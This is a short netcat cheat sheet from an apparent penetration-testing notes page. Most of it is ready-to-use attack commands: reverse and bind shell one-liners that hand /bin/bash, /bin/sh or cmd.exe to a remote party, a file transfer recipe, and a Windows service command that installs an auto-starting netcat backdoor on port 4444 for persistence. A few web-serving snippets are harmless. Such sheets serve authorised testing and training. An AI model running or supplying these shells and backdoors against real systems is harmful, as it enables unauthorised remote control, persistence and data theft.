# netcat

## <mark style="color:red;">Shell</mark>

### <mark style="color:orange;">reverse shell (for bind shell reverse the commands)</mark>

```
listener: nc -nvlp [local port]
client(linux): nc [remote port] -e /bin/bash
client(windows): nc [remote port] -e cmd.exe
```

### <mark style="color:orange;">reverse shell (BSD version)</mark>

```
rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 |nc 0.0.0.0 5555 >/tmp/f
```

### <mark style="color:orange;">bind shell (BSD version)</mark>

```
victim side:
mkfifo foo
nc -lk 2600 0<foo | /bin/bash 1>foo

attacker side:
nc [server ip] 2600
```

## <mark style="color:red;">File Transfer</mark>

### <mark style="color:orange;">push files from client to listener (and vice versa)</mark>

```
listener: nc -nvlp [local port] > [out file]
clinet: nc [ip] [remote port] < [in file]
```

### <mark style="color:orange;">netcat HTTP server</mark>

```
nc -kl 8000 --sh-exec "echo -e 'HTTP/1.1 200 OK\r\n'; date"
```

### <mark style="color:orange;">serve a single web page</mark>

```
while true; do nc -l -p 80 -q 1 < error.html; done
```

## <mark style="color:red;">add netcat as a service in windows</mark>

```
sc create NcService binPath= "cmd.exe /c start c:\nc.exe -nLp 4444 -e cmd.exe" start= auto error= ignore

sc start NcService

taskkill /f /im nc.exe
```
